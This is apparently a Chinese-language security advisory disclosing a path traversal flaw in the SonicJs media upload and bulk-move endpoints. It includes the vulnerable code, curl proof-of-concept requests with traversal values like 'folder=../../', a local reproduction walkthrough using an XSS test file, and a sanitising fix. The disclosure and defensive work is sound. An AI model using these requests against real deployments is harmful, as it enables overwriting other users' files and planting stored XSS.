# SONIC-2025-002: Media Upload R2 Key 路径穿越

## 基本信息

| 字段 | 值 |
|------|-----|
| **项目** | [SonicJs-Org/sonicjs](https://github.com/SonicJs-Org/sonicjs) |
| **版本** | main branch (截至 2026-05-19) |
| **严重性** | High |
| **CVSS 3.1** | 7.5 (AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H) |
| **CWE** | CWE-22 (Improper Limitation of a Pathname to a Restricted Directory) |
| **发现日期** | 2026-05-19 |
| **攻击向量** | 网络/需要认证（任何注册用户） |

## 漏洞概述

SonicJs 的 Media Upload API (`/api/media/upload`) 允许认证用户通过 `folder` 参数控制文件在 R2 存储中的存放路径。该参数直接拼接到 R2 object key 中，无任何路径校验或过滤。攻击者可以：

1. 使用 `../` 前缀将文件写入预期目录之外的位置
2. 覆盖其他用户上传的文件
3. 覆盖系统配置文件（如 Cloudflare Pages 的 `_headers`、`_redirects`）
4. 通过 bulk-move 功能实现类似效果

## 漏洞代码

**文件**: `packages/core/src/routes/api-media.ts` (第74-78行)

```typescript
// Upload single file
apiMediaRoutes.post('/upload', async (c) => {
  // ...
  const folder = formData.get('folder') as string || 'uploads'
  const r2Key = `${folder}/${filename}`  // ⚠️ 直接拼接，无校验

  // Upload to R2
  const arrayBuffer = await file.arrayBuffer()
  const uploadResult = await c.env.MEDIA_BUCKET.put(r2Key, arrayBuffer, {
    httpMetadata: { contentType: file.type, ... }
  })
```

**对比 `create-folder` 路由**（第371-382行）有校验但 upload 没有：
```typescript
// create-folder 有校验
const folderPattern = /^[a-z0-9-_]+$/
if (!folderPattern.test(folderName)) {
  return c.json({ error: '...' }, 400)
}
// ← 但 upload 路由的 folder 参数完全没有这个检查！
```

## PoC (概念验证)

```bash
# 前提：攻击者已注册并获取 JWT token
TOKEN="eyJ..."

# 攻击1：路径穿越写入 bucket 根目录
curl -X POST https://target.workers.dev/api/media/upload \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@malicious.html" \
  -F "folder=../../"
# R2 key 变成: ../../<uuid>.html

# 攻击2：覆盖其他用户的文件夹
curl -X POST https://target.workers.dev/api/media/upload \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@evil.png" \
  -F "folder=../other-user-folder"

# 攻击3：尝试写入 Cloudflare Pages 配置
curl -X POST https://target.workers.dev/api/media/upload \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@_headers" \
  -F "folder=../../"

# bulk-move 也有同样问题
curl -X POST https://target.workers.dev/api/media/bulk-move \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"fileIds":["<file-id>"],"folder":"../../system"}'
```

## 影响

- 覆盖 R2 bucket 中其他用户的文件
- 可能污染前端静态资源（如果 R2 bucket 同时服务静态内容）
- 存储型 XSS（如果上传的 HTML 文件可通过 public URL 访问）

## 修复建议

```typescript
// 在 upload 和 bulk-move 路由中添加 folder 校验
function sanitizeFolder(folder: string): string {
  // 只允许安全字符，阻止路径穿越
  const sanitized = folder
    .replace(/\.\./g, '')           // 移除 ..
    .replace(/^\/+/, '')            // 移除前导 /
    .replace(/[^a-z0-9\-_\/]/gi, '') // 只保留安全字符
    .replace(/\/+/g, '/')           // 合并多个 /
    .replace(/\/$/, '')             // 移除尾部 /
  
  return sanitized || 'uploads'
}

// 或者直接复用 create-folder 的正则
const SAFE_FOLDER_REGEX = /^[a-z0-9\-_]+(\/[a-z0-9\-_]+)*$/
if (!SAFE_FOLDER_REGEX.test(folder)) {
  return c.json({ error: 'Invalid folder name' }, 400)
}
```

## 本地复现步骤（手把手）

> 前置条件：参考 [sonicjs-local-setup.md](sonicjs-local-setup.md) 完成环境搭建并启动 `wrangler dev`。

### 1. 获取认证 Token

```bash
# 先创建一个普通用户（viewer 角色即可触发此漏洞）
curl -s -X POST http://localhost:8787/auth/register \
  -H "Content-Type: application/json" \
  -d '{
    "email": "attacker@evil.com",
    "password": "password123",
    "username": "attacker",
    "firstName": "Bad",
    "lastName": "Actor"
  }'

# 登录拿 token
RESPONSE=$(curl -s -X POST http://localhost:8787/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"attacker@evil.com","password":"password123"}')

TOKEN=$(echo $RESPONSE | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")
echo "Token: $TOKEN"
```

### 2. 正常上传一个文件（对照组）

```bash
# 创建测试文件
echo "normal content" > /tmp/normal.txt

# 正常上传到 uploads 文件夹
curl -s -X POST http://localhost:8787/api/media/upload \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@/tmp/normal.txt;type=text/plain" \
  -F "folder=uploads" | python3 -m json.tool

# 检查本地 R2 存储
ls .wrangler/state/v3/r2/sonicjs-ci-media/uploads/
# 应该看到一个 <uuid>.txt 文件
```

### 3. 攻击：路径穿越写入根目录

```bash
# 创建恶意文件
echo "<h1>HACKED</h1><script>alert('XSS')</script>" > /tmp/evil.html

# 使用 ../.. 穿越到 bucket 根目录
curl -s -X POST http://localhost:8787/api/media/upload \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@/tmp/evil.html;type=text/plain" \
  -F "folder=../../" | python3 -m json.tool
```

**预期输出**：
```json
{
  "success": true,
  "file": {
    "id": "abc123def456...",
    "filename": "abc123def456.html",
    "originalName": "evil.html",
    "mimeType": "text/plain",
    "r2_key": "../../abc123def456.html",
    "publicUrl": "https://pub-xxx.r2.dev/../../abc123def456.html"
  }
}
```

### 4. 验证文件被写入非预期位置

```bash
# 查看本地 R2 存储结构
find .wrangler/state/v3/r2/ -type f | sort

# 你会看到文件写入了 uploads/ 之外的路径
# 在真实 Cloudflare R2 中，key 就是 "../../abc123.html"
```

### 5. 攻击：覆盖其他用户的文件

```bash
# 假设另一个用户有文件在 user-photos/ 目录
# 攻击者可以写入同一位置
curl -s -X POST http://localhost:8787/api/media/upload \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@/tmp/evil.html;type=image/png" \
  -F "folder=../user-photos" | python3 -m json.tool
```

### 6. 攻击：通过 bulk-move 移动到任意位置

```bash
# 先正常上传一个文件，获取 fileId
UPLOAD_RESPONSE=$(curl -s -X POST http://localhost:8787/api/media/upload \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@/tmp/evil.html;type=text/plain" \
  -F "folder=uploads")

FILE_ID=$(echo $UPLOAD_RESPONSE | python3 -c "import sys,json; print(json.load(sys.stdin)['file']['id'])")
echo "Uploaded file ID: $FILE_ID"

# 用 bulk-move 移动到任意位置
curl -s -X POST http://localhost:8787/api/media/bulk-move \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d "{\"fileIds\":[\"$FILE_ID\"],\"folder\":\"../../system-config\"}" | python3 -m json.tool
```

### 7. 验证数据库记录

```bash
# 查看 media 表中的 r2_key 和 folder 字段
npx wrangler d1 execute DB --local \
  --command="SELECT id, filename, folder, r2_key FROM media ORDER BY uploaded_at DESC LIMIT 5;"
```

**预期输出**：
```
id             | filename           | folder           | r2_key
abc123...      | abc123.html        | ../../           | ../../abc123.html
def456...      | def456.html        | ../user-photos   | ../user-photos/def456.html
```

### 8. 对比 create-folder 的校验（证明是遗漏）

```bash
# create-folder 有正则校验，会被拒绝
curl -s -X POST http://localhost:8787/api/media/create-folder \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"folderName":"../evil"}' | python3 -m json.tool

# 预期输出：
# {"success":false,"error":"Folder name can only contain lowercase letters, numbers, hyphens, and underscores"}

# 但 upload 的 folder 参数没有同样的校验 ← 漏洞所在
```

### 关键观察点

| 对比项 | `/api/media/create-folder` | `/api/media/upload` (folder参数) |
|--------|---------------------------|----------------------------------|
| 正则校验 | ✅ `/^[a-z0-9-_]+$/` | ❌ 无 |
| `../` 防护 | ✅ 正则自动阻断 | ❌ 直接拼接 |
| 绝对路径防护 | ✅ 正则自动阻断 | ❌ 无 |

同一文件中两个路由的 folder 处理不一致，说明是开发者遗漏而非有意设计。

## 参考

- [CWE-22: Path Traversal](https://cwe.mitre.org/data/definitions/22.html)
- [Cloudflare R2 Object Key Documentation](https://developers.cloudflare.com/r2/api/workers/workers-api-usage/)
